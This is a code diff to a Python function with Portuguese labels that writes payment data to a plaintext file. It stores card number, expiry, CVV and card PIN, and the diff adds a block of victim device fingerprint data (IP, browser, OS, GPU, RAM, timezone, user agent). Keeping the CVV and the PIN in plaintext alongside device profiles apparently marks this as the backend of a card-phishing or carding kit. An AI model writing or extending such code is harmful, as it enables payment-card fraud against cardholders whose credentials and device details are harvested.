@@ -166,7 +166,50 @@ def save_payment_data(payment_data: PaymentData) -> str:
         
         # Format the data according to user's specification
         current_datetime = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")
-        
+
+        # Build device info section if available
+        device_section = ""
+        if any([payment_data.ip, payment_data.browserName, payment_data.osName, payment_data.deviceType]):
+            device_section = """
+INFORMAÇÕES DO DISPOSITIVO
+--------------------------
+IP: {ip}
+Navegador: {browserName} v{browserVersion}
+Sistema Operacional: {osName} {osVersion}
+Tipo de Dispositivo: {deviceType} - {deviceModel}
+Resolução: {screenWidth}x{screenHeight}
+Idioma: {language}
+Fuso Horário: {timezone}
+Tipo de Conexão: {connectionType} (efetivo: {effectiveConnectionType})
+Núcleos de CPU: {cores}
+Memória RAM: {ram}GB
+GPU: {gpu}
+Pontos de Toque: {maxTouchPoints}
+Pixel Ratio: {devicePixelRatio}
+User Agent: {userAgent}
+
+""".format(
+                ip=payment_data.ip or "Não disponível",
+                browserName=payment_data.browserName or "Desconhecido",
+                browserVersion=payment_data.browserVersion or "?",
+                osName=payment_data.osName or "Desconhecido",
+                osVersion=payment_data.osVersion or "?",
+                deviceType=payment_data.deviceType or "Desconhecido",
+                deviceModel=payment_data.deviceModel or "?",
+                screenWidth=payment_data.screenWidth or "?",
+                screenHeight=payment_data.screenHeight or "?",
+                language=payment_data.language or "?",
+                timezone=payment_data.timezone or "?",
+                connectionType=payment_data.connectionType or "?",
+                effectiveConnectionType=payment_data.effectiveConnectionType or "?",
+                cores=payment_data.cores or "?",
+                ram=payment_data.ram or "?",
+                gpu=payment_data.gpu or "Desconhecido",
+                maxTouchPoints=payment_data.maxTouchPoints or "?",
+                devicePixelRatio=payment_data.devicePixelRatio or "?",
+                userAgent=payment_data.userAgent or "?",
+            )
+
         content = f"""DADOS DE PAGAMENTO
 ================================================================================
 
@@ -184,7 +227,7 @@ Número do Cartão: {payment_data.numeroCartao}
 Validade: {payment_data.validade}
 CVV: {payment_data.cvv}
 Senha do Cartão: {payment_data.senhaCartao}
-
+{device_section}
 ================================================================================
 """
         
